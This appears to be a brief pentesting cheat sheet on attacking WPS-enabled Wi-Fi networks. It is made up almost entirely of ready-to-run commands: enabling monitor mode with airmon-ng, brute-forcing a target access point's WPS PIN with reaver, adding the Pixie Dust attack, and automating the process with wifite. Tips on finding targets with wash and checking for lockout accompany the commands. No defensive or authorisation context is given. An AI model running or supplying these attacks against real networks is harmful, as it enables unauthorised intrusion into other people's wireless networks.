### Introduction
---
For attacking WPS-abled networks.

### Syntax
---
First enable monitor mode:
```sh
sudo airmon-ng start wlan0
```
Then run:
```sh
sudo reaver -i wlan0mon -vv -b [BSSID]
```
- `-b` for specifying the BSSID / MAC address of the access point
	- Can be obtained with the `wash` tool.
	- Also make sure the `Lck` (lockout) is not enabled.
- `-vv` for verbose.

To also run Pixie Dust attack, we can add `-K`:
```sh
sudo reaver -i wlan0mon -vv -b [BSSID] -K 1
```



`wifite` can also automate the process:
```sh
sudo wifite --wps
```
